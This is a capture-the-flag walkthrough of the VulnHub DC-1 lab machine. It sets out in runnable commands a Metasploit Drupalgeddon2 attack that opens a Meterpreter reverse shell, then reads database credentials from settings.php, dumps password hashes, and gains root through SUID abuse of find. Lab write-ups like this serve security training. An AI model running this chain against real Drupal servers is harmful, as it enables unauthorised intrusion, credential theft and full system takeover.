@@ -1,0 +1,162 @@
+DC-1 VulnHub CTF Walkthrough (Full Root Exploit)
+Target Machine
+Name: DC-1
+
+Target IP: 192.168.189.130
+
+Attacker IP: 192.168.189.129
+
+🔍 Initial Recon
+Nmap Scan
+bash
+Copy
+Edit
+nmap -sS -sV -T4 192.168.189.130
+Open Ports:
+
+22/tcp - SSH
+
+80/tcp - HTTP (Drupal CMS Detected)
+
+🌐 Web Exploitation (Drupalgeddon2)
+Using Metasploit
+bash
+Copy
+Edit
+msfconsole
+use exploit/unix/webapp/drupal_drupalgeddon2
+set RHOST 192.168.189.130
+set LHOST 192.168.189.129
+run
+Result
+Successfully got a Meterpreter shell
+
+Shell user: www-data
+
+🔎 Enumeration in Meterpreter
+bash
+Copy
+Edit
+sysinfo
+id
+User: www-data
+
+Found Flag 1
+bash
+Copy
+Edit
+ls /var/www
+cat flag1.txt
+✅ Flag 1 found
+
+Drupal Configuration File
+bash
+Copy
+Edit
+cat /var/www/sites/default/settings.php
+Found DB credentials:
+
+user: dbuser
+
+pass: R0ck3t
+
+🛢️ Database Enumeration
+bash
+Copy
+Edit
+mysql -u dbuser -pR0ck3t
+Database: drupaldb
+
+sql
+Copy
+Edit
+SELECT uid, name, pass FROM users;
+Retrieved hashed passwords for:
+
+admin
+
+Fred
+
+🏠 Local File Enumeration
+bash
+Copy
+Edit
+ls /home
+cd /home/flag4
+cat flag4.txt
+✅ Flag 4 found
+"Can you get root access?"
+
+🔐 Privilege Escalation
+Checked Cron Jobs
+bash
+Copy
+Edit
+ls -al /etc/cron*
+Nothing interesting
+
+Checked SUID Binaries
+bash
+Copy
+Edit
+find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
+Found:
+
+/usr/bin/find — SUID bit set and owned by root
+
+Spawned Root Shell with SUID find
+bash
+Copy
+Edit
+find /dev -name null -exec /bin/sh \;
+bash
+Copy
+Edit
+id
+# uid=33(www-data) gid=33(www-data) euid=0(root)
+✅ Root Access Gained
+
+🎯 Root Flag
+bash
+Copy
+Edit
+cd /root
+cat thefinalflag.txt
+✅ Root Flag Found
+"Well done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7"
+
+✅ Summary Table
+Step	Outcome
+Recon	Drupal site identified
+Exploit	Drupalgeddon2 via Metasploit
+Initial Shell	www-data (Meterpreter)
+DB Creds	Found in settings.php
+Hash Dump	admin & Fred
+Priv Esc	SUID abuse with find
+Root Access	Achieved
+Final Flag	Retrieved from /root
+
+🧰 Tools Used
+Nmap
+
+Metasploit
+
+MySQL
+
+Linux file/system enumeration commands
+
+🏁 Notes
+Great beginner-friendly box
+
+Reinforces:
+
+Web CMS exploitation (Drupal)
+
+SUID privilege escalation
+
+Enumeration skills
+
+Time Taken: ~1–2 hours
+
+Credits: CTF by @DCAU7
+Writeup: Authored by Rahul Krishna TP
